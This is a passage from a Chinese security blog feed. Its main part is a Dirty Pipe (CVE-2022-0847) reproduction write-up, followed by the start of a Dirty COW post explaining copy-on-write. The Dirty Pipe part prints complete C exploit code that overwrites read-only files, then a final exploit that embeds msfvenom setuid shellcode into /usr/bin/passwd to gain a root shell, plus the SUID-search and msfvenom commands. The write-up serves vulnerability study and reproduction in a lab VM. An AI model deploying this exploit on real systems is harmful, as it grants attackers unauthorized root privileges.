title="0x03：漏洞分析"></a>0x03：漏洞分析</h1><p>我们现在知道以下几点</p><ul><li><strong>PIPE_BUF_FLAG_CAN_MERGE</strong>是<code>pipe_buffer-&gt;page</code>是否能写入的标志</li><li><code>pipe_write</code>中会将<code>pipe_buffer-&gt;flags</code>设置成<strong>PIPE_BUF_FLAG_CAN_MERGE</strong></li><li><code>pipe_read</code>中读取完成后<code>free</code>这些<code>page</code>并不会把<code>flags</code>置0</li><li>从文件复制到管道中<code>copy_page_to_iter_pipe</code>中<code>get_page</code>不会重新设置<code>flags</code>，因此此时<code>pipe_buffer</code>指向的<code>page</code>是目标文件映射的<code>page</code>，<code>pipe_buffer-&gt;flags</code> &amp;&amp; <strong>PIPE_BUF_FLAG_CAN_MERGE</strong> &#x3D;&#x3D; <code>true</code>，表示此时对这个<code>page</code>拥有写入权限了。这就意味着如果我们打开的是一个只有只读权限的文件，现在可以越权写入</li></ul><p>于是有了这样一个思路</p><ul><li>step Ⅰ：创建一个<code>pipe</code></li><li>step Ⅱ：把<code>pipe</code>写满，使所有pipe_buffer-&gt;flags都被设置上<strong>PIPE_BUF_FLAG_CAN_MERGE</strong></li><li>step Ⅲ：读取<code>pipe</code>中的所有数据，清空<code>pipe</code></li><li>step Ⅳ：打开目标文件，利用<code>splice</code>将内容从文件拷贝到管道，此时<code>pipe_buffer-&gt;page</code>为文件在内存中的映射页框，<code>pipe_buffer-&gt;flags</code>保留有之前设置的<strong>PIPE_BUF_FLAG_CAN_MERGE</strong>，此时在管道中对该文件具有写入权限。<code>pipe head</code> +1</li><li>step Ⅴ：利用<code>write</code>向管道中写入恶意数据，因为上一个 <code>pipe_buffer</code> 没有写满，从而将数据拷贝到上一个 <code>pipe_buffer</code> 对应的页面——即文件映射的页面。完成越权写入</li></ul><h1 id="0x04：漏洞利用"><a href="#0x04：漏洞利用" class="headerlink" title="0x04：漏洞利用"></a>0x04：漏洞利用</h1><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>经过上述分析利用demo就很好写了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_DEF_BUFFERS 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DATA_SIZE PAGE_SIZE*PIPE_DEF_BUFFERS</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">dest_st</span>;</span><br><span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>], dest_fd;<br><span class="hljs-type">pid_t</span> fork_pid;<br><span class="hljs-type">char</span> * data;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span> * argv[], <span class="hljs-type">char</span> * envp[])</span><br>&#123;<br>    data = mmap(<span class="hljs-literal">NULL</span>, DATA_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] make pipe_buffer all flags-&gt; PIPE_BUF_FLAG_CAN_MERGE&quot;</span>);<br>    pipe(pipe_fd);<br>    fork_pid = fork();<br>    <span class="hljs-keyword">if</span> (fork_pid &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;fork failed!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fork_pid == <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pipe write&quot;</span>);<br>        write(pipe_fd[<span class="hljs-number">1</span>], data, DATA_SIZE);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pipe read&quot;</span>);<br>    read(pipe_fd[<span class="hljs-number">0</span>], data, DATA_SIZE);<br><br><br>    dest_fd = open(argv[<span class="hljs-number">1</span>], O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dest_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;open dest file failed!&quot;</span>);<br><br>    fstat(dest_fd, &amp;dest_st);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] keep the flags-&gt;PIPE_BUF_FLAG_CAN_MERGE&quot;</span>);<br>    splice(dest_fd, <span class="hljs-literal">NULL</span>, pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, SPLICE_F_MOVE);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] overwrite now&quot;</span>);<br>    write(pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;\nkorey0sh1\n&quot;</span>, <span class="hljs-number">11</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>随便用qemu起了个环境，kernel version &#x3D; 5.8</p><p>效果还是很成功的</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240321143920.png" style="zoom: 67%;" /><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>常规的<strong>suid</strong>提权方式</p><p>查看具有root权限的suid文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>此处还是选择老朋友&#x2F;usr&#x2F;bin&#x2F;passwd</p><p>用msf生成提权的shellcode</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x64/exec PrependSetuid=True -f elf | xxd -i<br></code></pre></td></tr></table></figure><h3 id="final-exp"><a href="#final-exp" class="headerlink" title="final exp"></a>final exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_DEF_BUFFERS 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DATA_SIZE PAGE_SIZE*PIPE_DEF_BUFFERS</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">dest_st</span>;</span><br><span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>], dest_fd;<br><span class="hljs-type">pid_t</span> fork_pid;<br><span class="hljs-type">char</span> * data;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> attack_data[] = &#123;<br>  <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x95</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x62</span>,<br>  <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5e</span>,<br>  <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span><br>&#125;;<br><br><span class="hljs-type">int</span> data_len = <span class="hljs-number">149</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span> * argv[], <span class="hljs-type">char</span> * envp[])</span><br>&#123;<br>    data = mmap(<span class="hljs-literal">NULL</span>, DATA_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] make pipe_buffer all flags-&gt; PIPE_BUF_FLAG_CAN_MERGE&quot;</span>);<br>    pipe(pipe_fd);<br>    fork_pid = fork();<br>    <span class="hljs-keyword">if</span> (fork_pid &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;fork failed!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fork_pid == <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pipe write&quot;</span>);<br>        write(pipe_fd[<span class="hljs-number">1</span>], data, DATA_SIZE);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pipe read&quot;</span>);<br>    read(pipe_fd[<span class="hljs-number">0</span>], data, DATA_SIZE);<br><br><br>    dest_fd = open(argv[<span class="hljs-number">1</span>], O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dest_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;open dest file failed!&quot;</span>);<br><br>    fstat(dest_fd, &amp;dest_st);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] keep the flags-&gt;PIPE_BUF_FLAG_CAN_MERGE&quot;</span>);<br>    splice(dest_fd, <span class="hljs-literal">NULL</span>, pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, SPLICE_F_MOVE);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] overwrite now&quot;</span>);<br>    <span class="hljs-comment">//从第二位开始覆写</span><br>    write(pipe_fd[<span class="hljs-number">1</span>], &amp;attack_data[<span class="hljs-number">1</span>], data_len<span class="hljs-number">-1</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>环境：</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240321201804.png"></p><p>运行效果</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/5365682d6c51a6882c74dd06b604bb9.png"></p><h1 id="some-tricks"><a href="#some-tricks" class="headerlink" title="some tricks"></a>some tricks</h1><p>笔者在最后一直苦于找不到合适的kernel版本的虚拟机呜呜呜呜呜，因为下了个挺古早版本的ubuntu20，觉得应该能符合版本要求</p><p>结果玩意会自动更新，下下来漏洞都是被patch的</p><p>最后发现了<a href="https://bbs.kanxue.com/user-home-919002.htm">xi@0ji233</a> 的文章，了解到了一种十分方便快捷的更换kernel版本的方法</p><p>首先先用apt寻找一下这个版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-cache search linux | grep 5.8.<br></code></pre></td></tr></table></figure><p>选择这个</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240321203416.png"></p><p>下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install linux-image-5.8.0-63-generic<br></code></pre></td></tr></table></figure><p>接下来更改grub启动项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo gedit /etc/default/grub<br></code></pre></td></tr></table></figure><p>改成这样</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># If you change this file, run &#x27;update-grub&#x27; afterwards to update</span><br><span class="hljs-comment"># /boot/grub/grub.cfg.</span><br><span class="hljs-comment"># For full documentation of the options in this file, see:</span><br><span class="hljs-comment">#   info -f grub -n &#x27;Simple configuration&#x27;</span><br><br><span class="hljs-attr">GRUB_DEFAULT</span>=<span class="hljs-number">0</span><br><span class="hljs-attr">GRUB_TIMEOUT_STYLE</span>=hidden<br><span class="hljs-attr">GRUB_TIMEOUT</span>=<span class="hljs-number">30</span><br><span class="hljs-attr">GRUB_DISTRIBUTOR</span>=`lsb_release -i -s <span class="hljs-number">2</span>&gt; /dev/null || echo Debian`<br><span class="hljs-attr">GRUB_CMDLINE_LINUX_DEFAULT</span>=<span class="hljs-string">&quot;text&quot;</span><br><span class="hljs-attr">GRUB_CMDLINE_LINUX</span>=<span class="hljs-string">&quot;find_preseed=/preseed.cfg auto noprompt priority=critical locale=en_US&quot;</span><br><br><span class="hljs-comment"># Uncomment to enable BadRAM filtering, modify to suit your needs</span><br><span class="hljs-comment"># This works with Linux (no patch required) and with any kernel that obtains</span><br><span class="hljs-comment"># the memory map information from GRUB (GNU Mach, kernel of FreeBSD ...)</span><br><span class="hljs-comment">#GRUB_BADRAM=&quot;0x01234567,0xfefefefe,0x89abcdef,0xefefefef&quot;</span><br><br><span class="hljs-comment"># Uncomment to disable graphical terminal (grub-pc only)</span><br><span class="hljs-comment">#GRUB_TERMINAL=console</span><br><br><span class="hljs-comment"># The resolution used on graphical terminal</span><br><span class="hljs-comment"># note that you can use only modes which your graphic card supports via VBE</span><br><span class="hljs-comment"># you can see them in real GRUB with the command `vbeinfo&#x27;</span><br><span class="hljs-comment">#GRUB_GFXMODE=640x480</span><br><br><span class="hljs-comment"># Uncomment if you don&#x27;t want GRUB to pass &quot;root=UUID=xxx&quot; parameter to Linux</span><br><span class="hljs-comment">#GRUB_DISABLE_LINUX_UUID=true</span><br><br><span class="hljs-comment"># Uncomment to disable generation of recovery mode menu entries</span><br><span class="hljs-comment">#GRUB_DISABLE_RECOVERY=&quot;true&quot;</span><br><br><span class="hljs-comment"># Uncomment to get a beep at grub start</span><br><span class="hljs-comment">#GRUB_INIT_TUNE=&quot;480 440 1&quot;</span><br></code></pre></td></tr></table></figure><p>更新<code>grub</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo update-grub<br></code></pre></td></tr></table></figure><p>reboot重启后狂按<strong>SHIFT+TAB</strong>进入引导模式，选择高级设置，选择新下载的内核版本，即可完成环境搭建</p><h1 id="0xff：写在最后的最后"><a href="#0xff：写在最后的最后" class="headerlink" title="0xff：写在最后的最后"></a>0xff：写在最后的最后</h1><p><a href="https://dirtypipe.cm4all.com/">The Dirty Pipe Vulnerability — The Dirty Pipe Vulnerability documentation (cm4all.com)</a></p><p>拜读完漏洞发现者的博客，敬佩他居然能从一次小小的<strong>CRC</strong>校验错误入手，深挖近一年时间，挖掘原本并不熟悉的<strong>Linux Kernel</strong>，</p><p>并最终发现了<strong>Dirty Pipe</strong>这一威力巨大的内核<code>0day</code></p><p>作者的探索精神，值得笔者学习</p><p><strong>路漫漫其修远兮，吾将上下而求索</strong></p><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><p><a href="https://bbs.kanxue.com/thread-280442.htm">CVE-2022-0847 dirtypipe漏洞复现-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p><p><a href="https://arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/#%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%B0%E7%AE%A1%E9%81%93">【CVE.0x06】CVE-2022-0847 漏洞复现及简要分析 - arttnba3’s blog</a></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2016-5195(Dirty Cow) Remake</title>
    <link href="/2024/02/27/dirtycow/"/>
    <url>/2024/02/27/dirtycow/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00：写在一切之前"><a href="#0x00：写在一切之前" class="headerlink" title="0x00：写在一切之前"></a>0x00：写在一切之前</h1><p>把A3👴的kernel Ⅰ和kernel Ⅱ追完了</p><p>康康能不能复现一些kernel CVE</p><h1 id="0x01：信息收集"><a href="#0x01：信息收集" class="headerlink" title="0x01：信息收集"></a>0x01：信息收集</h1><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-5195">NVD - CVE-2016-5195 (nist.gov)</a></p><p>2016年10月18日，黑客<code>Phil Oester</code>提交了隐藏长达9年之久的“脏牛漏洞（<strong>Dirty COW</strong>）”0day漏洞。该漏洞表明<code>Linux</code>内核的内存子系统在处理写时复制（<strong>Copy-on-Write</strong>)时存在条件竞争漏洞，导致可以破坏私有只读内存映射。黑客可以获取低权限的本地用户后，利用此漏洞获取其他只读内存映射的写权限，进一步获取root权限。</p><p><strong>Dirty Cow</strong>在2.x到4.8.2及以下的<code>version</code>中都可以完成利用，作用范围十分广泛。最后，此漏洞由<code>linux</code>创始人<strong>linus</strong>亲手修复</p><h1 id="0x02：前置"><a href="#0x02：前置" class="headerlink" title="0x02：前置"></a>0x02：前置</h1><p><strong>文中所有的源码均为4.8.2 version</strong></p><h2 id="COW（copy-to-write）"><a href="#COW（copy-to-write）" class="headerlink" title="COW（copy-to-write）"></a>COW（copy-to-write）</h2><p>写时复制（<strong>Copy-on-Write，COW</strong>）是一种计算机编程中的优化技术，通常用于处理共享数据的情况。在使用写时复制时，系统会在多个客户端（或者线程）共享同一份数据的情况下，只有在有一个客户端试图修改数据时才会复制数据，以确保修改操作不会影响其他客户端。</p><p>具体到<code>fork()</code>中来说，父进程和子进程共享同一个页框，只有当其中两方中的任意一方试图修改该页框中的内容时，才会分配一个新的页框，将原先页框的内容<code>copy</code>到新的页框，在新的页框进行修改</p><ul><li><code>fork()</code>执行后，父子进程共享所有页框，所有页框被标记为<code>read-only</code></li><li>当要修改页框时，因为是<code>read-only</code>，所以会触发<code>page fault</code>（缺页异常）——内核才会分配一个新的页框</li></ul><p>大致流程如下图所示。别骂了别骂了知道我字丑呜呜呜:（</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240301121649.png" style="zoom:67%;" /><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240301121717.png" style="zoom:67%;" /><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240301121748.png" style="zoom:67%;" /><h3 id="mmap与COW"><a href="#mmap与COW" class="headerlink" title="mmap与COW"></a>mmap与COW</h3><p>当我们使用 <code>mmap</code> 将一个文件映射到内存时，并且该文件具有只读权限而没有写权限时，若我们尝试向这个映射区域写入数据，系统会启动写时复制（<strong>copy-on-write</strong>）机制。这会导致系统将文件内容的副本拷贝到内存中，以便进程可以对这个区域进行修改，而不会影响到硬盘上原始文件的内容。</p><h2 